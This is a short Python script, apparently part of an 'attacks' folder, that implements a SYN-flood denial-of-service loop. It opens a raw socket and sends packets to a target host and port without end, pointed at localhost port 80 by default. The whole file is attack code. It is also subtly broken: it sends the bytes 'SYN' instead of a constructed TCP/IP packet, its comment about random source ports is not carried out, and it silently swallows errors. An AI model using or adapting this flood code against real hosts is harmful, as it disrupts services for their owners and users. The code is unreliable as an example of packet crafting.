# attacks/syn_flood.py
import socket
import random
import time

def syn_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    while True:
        # For simplicity, send dummy SYN packets with random source port
        # (You need root for raw sockets)
        try:
            sock.sendto(b"SYN", (target_ip, target_port))
        except Exception:
            pass
        time.sleep(0.01)

if __name__ == "__main__":
    syn_flood("127.0.0.1", 80)
